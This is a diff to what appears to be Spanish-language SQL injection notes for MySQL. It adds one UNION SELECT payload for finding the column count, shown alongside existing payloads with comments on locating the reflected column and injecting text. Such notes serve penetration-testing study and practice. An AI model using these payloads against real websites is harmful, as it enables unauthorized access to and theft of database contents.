@@ -67,6 +67,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ```bash
 # MYSQL
 
+❯ union select 1,2,3 --+                              # Determinar el numero de columnas 
 ❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
 ❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
 ❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
